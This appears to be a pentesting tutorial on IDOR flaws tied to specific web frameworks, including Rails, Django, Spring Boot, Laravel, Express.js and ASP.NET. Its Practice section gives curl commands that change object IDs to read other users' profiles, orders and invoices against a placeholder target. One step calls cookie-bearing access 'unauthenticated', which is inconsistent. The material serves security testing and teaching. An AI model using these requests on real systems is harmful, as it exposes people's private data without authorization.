# Framework Specific IDOR

## Context

Insecure Direct Object References (IDOR) occur when an application exposes a reference to an internal object, such as a file, database record, or key, through user input without proper access controls. This document focuses on exploiting IDOR vulnerabilities unique to specific web frameworks, leveraging implicit behaviors and common misconfigurations. 

## Theory

### Framework-Specific IDOR Vulnerabilities

IDOR vulnerabilities can manifest uniquely across different web frameworks due to varying design patterns and default behaviors. These vulnerabilities often arise from the framework's routing, Object-Relational Mapping (ORM), or access control patterns, potentially leading to unintended trust or shortcuts in object access logic. Developers, relying on the framework's default configurations, might inadvertently omit explicit authorization checks, making applications prone to unauthorized data access.

### Common Framework Patterns Leading to IDOR

Attackers typically exploit IDOR by manipulating object references within requests, thereby accessing unauthorized resources. Common implementation flaws occur when developers use autogenerated routes or RESTful controllers without enforcing per-object authorization. Likewise, mass assignment or model binding can unintentionally expose sensitive fields to unauthorized users.

### Framework-Specific Examples

Frameworks such as Rails, Django, Spring Boot, and others introduce specific IDOR risks:

- **Rails:** Frequently, missing 'before_action :authorize' in controllers leads to access vulnerabilities.
- **Django:** Use of generic views without object-level permission checks can expose objects.
- **Spring Boot:** Repository endpoints might not have method-level security, leading to unauthorized access.
- **Laravel:** Route model binding without enforcing policies leaves endpoints negligent of authorization.
- **Express.js:** Exposing MongoDB IDs directly in routes without validation opens up IDOR risks.
- **ASP.NET:** Default scaffolding often lacks customized authorization attributes, which should be applied to restrict access.
- **PHP/Flask/Node.js:** Manual routing without sufficient access controls leaves gaps for exploitation.

## Practice

Below are practical steps to exploit IDOR vulnerabilities across different web frameworks.

### Exploiting Rails IDOR via Missing Authorization Filter

- Send a crafted request that accesses another user's data by altering the user ID in the URL:
  ```bash
  curl -b session=VALID_SESSION_COOKIE https://target/users/2.json
  ```
- Observe how the lack of authorization results in sensitive data access.

### Exploiting Django IDOR via Generic View

- Manipulate the user ID in the profile endpoint to access different profiles:
  ```bash
  curl -b sessionid=VALID_SESSION_COOKIE https://target/profile/3/
  ```
- Gaining access to unauthorized profiles without object-level permission.

### Spring Boot Repository Endpoint IDOR

- Directly query the repository endpoint for user records by changing user IDs:
  ```bash
  curl -H 'Authorization: Bearer VALID_JWT' https://target/api/users/5
  ```
- Obtain sensitive data due to missing restrictions on repository access.

### Laravel Route Model Binding IDOR

- Modify order IDs in the request to access other users' orders:
  ```bash
  curl -b laravel_session=VALID_SESSION_COOKIE https://target/orders/10
  ```
- Identifying lack of policy enforcement leading to order disclosure.

### Express.js IDOR via Direct Object Reference

- Supply different MongoDB ObjectIDs to access various documents:
  ```bash
  curl -b session=VALID_SESSION_COOKIE https://target/api/documents/abc123
  ```
- Unauthorized document access achieved by ObjectID manipulation.

### ASP.NET Scaffolding IDOR

- Request invoice details by changing the user ID using scaffolded routes:
  ```bash
  curl -b .AspNetCore.Cookies=VALID_COOKIE https://target/Invoices/Details/7
  ```
- Exploiting default routes to access sensitive invoice data unauthenticated.

### PHP/Flask/Node.js Manual Routing IDOR

- Alter user IDs within manually exposed API endpoints:
  ```bash
  curl -b session=VALID_SESSION_COOKIE https://target/api/user/4
  ```
- Exploiting insufficient manual access checks to acquire other users' data.

## Tools

- **curl**
- **Burp Suite**
- **Postman** 

Successful exploitation of IDOR vulnerabilities requires recognition of framework-specific patterns that lead to unauthorized resource access due to omitted checks or insufficiently customized authorizations.
